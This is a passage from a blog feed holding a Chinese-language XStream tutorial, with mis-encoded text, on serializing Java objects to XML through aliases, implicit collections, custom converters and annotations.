<li><a href="https://hexo.io/zh-cn/docs/tag-plugins.html" rel="external nofollow noopener noreferrer" target="_blank">æ ‡ç­¾æ’ä»¶ï¼ˆTag Pluginsï¼‰ | Hexo</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> hexo </category>
            
        </categories>
        
        
        <tags>
            
            <tag> mindmap </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[xstreamæ•™ç¨‹]]></title>
      <url>http://qsli.github.io/2016/12/27/xstream/</url>
      <content type="html"><![CDATA[<h1 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h1><p><img src="http://x-stream.github.io/logo.gif" alt></p>
<h2 id="pomä¾èµ–"><a href="#pomä¾èµ–" class="headerlink" title="pomä¾èµ–"></a>pomä¾èµ–</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.thoughtworks.xstream/xstream --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.thoughtworks.xstream<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xstream<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="è¾“å‡ºxml"><a href="#è¾“å‡ºxml" class="headerlink" title="è¾“å‡ºxml"></a>è¾“å‡ºxml</h2><h3 id="æ‰‹åŠ¨é…ç½®"><a href="#æ‰‹åŠ¨é…ç½®" class="headerlink" title="æ‰‹åŠ¨é…ç½®"></a>æ‰‹åŠ¨é…ç½®</h3><p>Author ç±»</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Author</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Author</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Entry ç±»</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Entry</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String title, description;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Entry</span><span class="params">(String title, String description)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.title = title;</span><br><span class="line">        <span class="keyword">this</span>.description = description;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Blog ç±»</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Blog</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Author writer;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> List entries = <span class="keyword">new</span> ArrayList();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Blog</span><span class="params">(Author writer)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.writer = writer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(Entry entry)</span> </span>&#123;</span><br><span class="line">        entries.add(entry);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List <span class="title">getContent</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> entries;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Blog teamBlog = <span class="keyword">new</span> Blog(<span class="keyword">new</span> Author(<span class="string">"qisheng.li"</span>));</span><br><span class="line">        teamBlog.add(<span class="keyword">new</span> Entry(<span class="string">"first"</span>, <span class="string">"first blog entry"</span>));</span><br><span class="line">        teamBlog.add(<span class="keyword">new</span> Entry(<span class="string">"second"</span>, <span class="string">"second blog entry"</span>));</span><br><span class="line"></span><br><span class="line">        XStream xStream = <span class="keyword">new</span> XStream();</span><br><span class="line">        System.out.println(xStream.toXML(teamBlog));        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¾“å‡ºçš„å†…å®¹ä¸º:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">com.air.xml.xstream.alias.Blog</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">writer</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>qisheng.li<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">writer</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entries</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">com.air.xml.xstream.alias.Entry</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">title</span>&gt;</span>first<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">description</span>&gt;</span>first blog entry<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">com.air.xml.xstream.alias.Entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">com.air.xml.xstream.alias.Entry</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">title</span>&gt;</span>second<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">description</span>&gt;</span>second blog entry<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">com.air.xml.xstream.alias.Entry</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entries</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">com.air.xml.xstream.alias.Blog</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><em>é»˜è®¤è¾“å‡ºçš„ç±»ï¼Œæ˜¯fully qualified nameï¼Œå¯ä»¥æ‰‹åŠ¨è®¾ç½®åˆ«å</em></li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//alias</span></span><br><span class="line">        xStream.alias(<span class="string">"blog"</span>, Blog<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        xStream.alias(<span class="string">"entry"</span>, Entry<span class="class">.<span class="keyword">class</span>)</span>;</span><br></pre></td></tr></table></figure>
<p>è¾“å‡º:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">blog</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">writer</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>qisheng.li<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">writer</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entries</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">title</span>&gt;</span>first<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">description</span>&gt;</span>first blog entry<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">title</span>&gt;</span>second<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">description</span>&gt;</span>second blog entry<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entries</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">blog</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><em>ä¹Ÿå¯ä»¥è®¾ç½®å±æ€§çº§åˆ«çš„åˆ«å</em></li>
</ul>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xStream.aliasField("author", Blog.class, "writter");</span><br></pre></td></tr></table></figure>
<p>è¾“å‡ºï¼š</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">blog</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">author</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>qisheng.li<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entries</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">title</span>&gt;</span>first<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">description</span>&gt;</span>first blog entry<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">title</span>&gt;</span>second<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">description</span>&gt;</span>second blog entry<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entries</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">blog</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><em>åŒ…çº§åˆ«çš„åˆ«å</em></li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xStream.aliasPackage(<span class="string">"aliased.pachage.name"</span>, <span class="string">"com.air.xml.xstream.alias"</span>);</span><br></pre></td></tr></table></figure>
<p>è¾“å‡ºçš„xml:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">aliased.pachage.name.Blog</span> <span class="attr">author</span>=<span class="string">"qisheng.li"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>first<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>first blog entry<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>second<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>second blog entry<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">aliased.pachage.name.Blog</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="Implicit-Collections"><a href="#Implicit-Collections" class="headerlink" title="Implicit Collections"></a>Implicit Collections</h4><blockquote>
<p>implicit collection: whenever you have a collection which doesnâ€™t need to display itâ€™s root tag, you can map it as an implicit collection.</p>
</blockquote>
<p>å¦‚æœä¸æƒ³å±•ç¤ºä¸€ä¸ªé›†åˆçš„rootèŠ‚ç‚¹ï¼Œæ¯”å¦‚ä¸Šè¿°çš„<code>entries</code>ï¼Œå¯ä»¥å°†å…¶å½“åšä¸€ä¸ª<code>implicit collection</code></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//implicit collection</span></span><br><span class="line">xStream.addImplicitCollection(Blog.class, "entries");</span><br></pre></td></tr></table></figure>
<p>è¾“å‡º:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">blog</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">author</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>qisheng.li<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>first<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>first blog entry<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>second<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>second blog entry<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">blog</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°<code>entries</code>è¿™ä¸ªèŠ‚ç‚¹å·²ç»æ²¡æœ‰äº†</p>
<h4 id="fieldè¾“å‡ºä¸ºå±æ€§å€¼"><a href="#fieldè¾“å‡ºä¸ºå±æ€§å€¼" class="headerlink" title="fieldè¾“å‡ºä¸ºå±æ€§å€¼"></a>fieldè¾“å‡ºä¸ºå±æ€§å€¼</h4><p>æ¥ç€ä¸Šé¢çš„ä¾‹å­ï¼Œæˆ‘ä»¬ç°åœ¨æƒ³è®©Blogçš„writerè¾“å‡ºä¸ºBlogæ ‡ç­¾çš„å±æ€§å€¼ã€‚</p>
<p>å®ç°æ­¥éª¤ï¼š</p>
<p>1.åˆ›å»ºä¸€ä¸ªè½¬æ¢å™¨</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AuthorConverter</span>  <span class="keyword">implements</span> <span class="title">SingleValueConverter</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">(Object obj)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ((Author) obj).getName();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">fromString</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Author(str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">canConvert</span><span class="params">(Class type)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> type.equals(Author<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>2.æ³¨å†Œè¿™ä¸ªè½¬æ¢å™¨</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xStream.registerConverter(<span class="keyword">new</span> AuthorConverter());</span><br></pre></td></tr></table></figure>
<p>3.å‘Šè¯‰XStream</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//attribute aliasing</span></span><br><span class="line">xStream.useAttributeFor(Blog.class, "writer");</span><br><span class="line">xStream.registerConverter(<span class="keyword">new</span> AuthorConverter());</span><br><span class="line"><span class="comment">//field alias</span></span><br><span class="line">xStream.aliasField("author", Blog.class, "writer");</span><br></pre></td></tr></table></figure>
<p>è¾“å‡ºçš„xmlï¼š</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">blog</span> <span class="attr">author</span>=<span class="string">"qisheng.li"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>first<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>first blog entry<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>second<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>second blog entry<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">blog</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="åŸºäºæ³¨è§£"><a href="#åŸºäºæ³¨è§£" class="headerlink" title="åŸºäºæ³¨è§£"></a>åŸºäºæ³¨è§£</h3><p>ä¸»è¦ä½¿ç”¨çš„æ˜¯<code>XStreamAlias</code>æ³¨è§£æ¥æ ‡è®°åˆ«å</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@XStreamAlias</span>(<span class="string">"message"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RendezvousMessage</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@XStreamAlias</span>(<span class="string">"type"</span>)</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> messageType;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">RendezvousMessage</span><span class="params">(<span class="keyword">int</span> messageType)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.messageType = messageType;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        XStream xStream = <span class="keyword">new</span> XStream();</span><br><span class="line">        xStream.processAnnotations(RendezvousMessage<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        RendezvousMessage rendezvousMessage = <span class="keyword">new</span> RendezvousMessage(<span class="number">12</span>);</span><br><span class="line">        System.out.println(xStream.toXML(rendezvousMessage));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>xml è¾“å‡º</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">type</span>&gt;</span>12<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>ImplicitCollection</li>
</ul>
<p>ä½¿ç”¨ <code>@XstreamImplicit(itemFieldName = &quot;xxx&quot;)</code>æ¥å¤„ç†</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@XStreamImplicit</span>(itemFieldName = <span class="string">"part"</span>)</span><br><span class="line"><span class="keyword">private</span> List&lt;String&gt; content;</span><br></pre></td></tr></table></figure>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">type</span>&gt;</span>12<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">part</span>&gt;</span>first content<span class="tag">&lt;/<span class="name">part</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">part</span>&gt;</span>second content<span class="tag">&lt;/<span class="name">part</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>converter</li>
</ul>
<p>æ·»åŠ ä¸€ä¸ªå±æ€§å­—æ®µå¹¶æŒ‡æ˜ä»–ä½¿ç”¨çš„è½¬æ¢å™¨, å’Œä¸€ä¸ªåŸºæœ¬ç±»å‹â€”â€”boolean</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@XStreamConverter</span>(value=BooleanConverter<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class"><span class="title">private</span> <span class="title">boolean</span> <span class="title">important</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@XStreamConverter</span>(SingleValueCalendarConverter<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class"><span class="title">private</span> <span class="title">Calendar</span> <span class="title">created</span> </span>= <span class="keyword">new</span> GregorianCalendar();</span><br></pre></td></tr></table></figure>
<p>è½¬åŒ–å™¨ä»£ç </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SingleValueCalendarConverter</span> <span class="keyword">implements</span> <span class="title">Converter</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">marshal</span><span class="params">(Object source, HierarchicalStreamWriter writer, MarshallingContext context)</span> </span>&#123;</span><br><span class="line">        Calendar calendar = (Calendar) source;</span><br><span class="line">        writer.setValue(String.valueOf(calendar.getTime().getTime()));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">unmarshal</span><span class="params">(HierarchicalStreamReader reader, UnmarshallingContext context)</span> </span>&#123;</span><br><span class="line">        GregorianCalendar calendar = <span class="keyword">new</span> GregorianCalendar();</span><br><span class="line">        calendar.setTime(<span class="keyword">new</span> Date(Long.parseLong(reader.getValue())));</span><br><span class="line">        <span class="keyword">return</span> calendar;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">canConvert</span><span class="params">(Class type)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> type.equals(GregorianCalendar<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¾“å‡ºçš„xmlç»“æœï¼š</p>
